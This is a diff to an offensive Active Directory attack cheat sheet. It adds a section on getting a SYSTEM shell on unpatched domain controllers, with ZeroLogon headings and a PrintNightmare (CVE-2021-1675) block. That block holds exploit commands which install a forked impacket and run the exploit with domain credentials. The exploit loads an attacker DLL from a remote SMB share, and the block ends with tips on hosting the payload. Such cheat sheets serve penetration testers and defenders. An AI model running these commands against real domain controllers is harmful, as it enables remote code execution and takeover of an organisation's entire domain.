@@ -11,7 +11,9 @@
     - [Using AD Module](#using-ad-module)
   - [Most common paths to AD compromise](#most-common-paths-to-ad-compromise)
     - [MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability)](#ms14-068-microsoft-kerberos-checksum-validation-vulnerability)
-    - [CVE-2020-1472 ZeroLogon](#cve-2020-1472-zerologon)
+    - [From CVE to SYSTEM shell on DC](#from-cve-to-system-shell-on-dc)
+      - [CVE-2020-1472 ZeroLogon](#cve-2020-1472-zerologon)
+      - [CVE-2021-1675 PrintNightmare](#cve-2021-1675-printnightmare)
     - [Open Shares](#open-shares)
     - [SCF and URL file attack against writeable share](#scf-and-url-file-attack-against-writeable-share)
     - [Passwords in SYSVOL & Group Policy Preferences](#passwords-in-sysvol-&-group-policy-preferences)
@@ -499,7 +501,12 @@ Windows> net time /domain /set
 
 * Ensure the DCPromo process includes a patch QA step before running DCPromo that checks for installation of KB3011780. The quick and easy way to perform this check is with PowerShell: get-hotfix 3011780
 
-### CVE-2020-1472 ZeroLogon
+### From CVE to SYSTEM shell on DC
+
+> Sometimes you will find a Domain Controller without the latest patches installed, use the newest CVE to gain a SYSTEM shell on it. If you have a "normal user" shell on the DC you can also try to elevate your privileges using one of the methods listed in [Windows - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
+
+
+#### CVE-2020-1472 ZeroLogon
 
 White Paper from Secura : https://www.secura.com/pathtoimg.php?id=2055
 
@@ -571,7 +578,36 @@ Exploit steps from the white paper
   lsadump::postzerologon /target:10.10.10.10 /account:DC01$
   ```
 
+#### CVE-2021-1675 PrintNightmare
+
+The DLL will be stored in `C:\Windows\System32\spool\drivers\x64\3\`.
+The exploit will execute the DLL.
+
+Requirement:
+* **Spooler Service** enabled
+* Windows Server promoted as **Domain Controller**
+
+```powershell
+# https://github.com/cube0x0/CVE-2021-1675
+pip3 uninstall impacket
+git clone https://github.com/cube0x0/impacket
+cd impacket
+python3 ./setup.py install
+python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'
+python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'
+C:\SharpPrintNightmare.exe C:\addCube.dll
+
+# https://github.com/afwu/PrintNightmare
+.\PrintNightmare.exe dc_ip path_to_exp user_name password
+.\PrintNightmare.exe 192.168.5.129 \\192.168.5.197\test\MyExploit.dll user2 test123
+```
+
+**NOTE**: Do not use Impacket SMB server to host the payload. The exploit works better with an anonymous share on Samba or Windows native SMB.
+
+
 ### Open Shares
+
+> Some shares can be accessible without authentication, explore them to find some juicy files
 
 * [smbmap](https://github.com/ShawnDEvans/smbmap)
   ```powershell
